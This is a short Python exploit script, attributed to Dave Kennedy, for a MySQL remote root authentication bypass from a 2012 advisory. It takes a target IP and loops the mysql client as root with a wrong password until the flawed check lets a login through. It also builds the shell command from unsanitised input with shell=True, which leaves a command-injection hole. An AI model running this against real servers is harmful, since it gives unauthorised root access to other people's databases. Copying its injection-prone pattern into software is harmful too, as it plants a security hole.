#!/usr/bin/python
#
#
# This has to be the easiest "exploit" ever. Seriously. Embarassed to submit this a little.
#
# Title: MySQL Remote Root Authentication Bypass
# Written by: Dave Kennedy (ReL1K)
# http://www.secmaniac.com
#
# Original advisory here: seclists.org/oss-sec/2012/q2/493
import subprocess
 
ipaddr = raw_input("Enter the IP address of the mysql server: ")
 
while 1:
    subprocess.Popen("mysql --host=%s -u root mysql --password=blah" % (ipaddr), shell=True).wait()
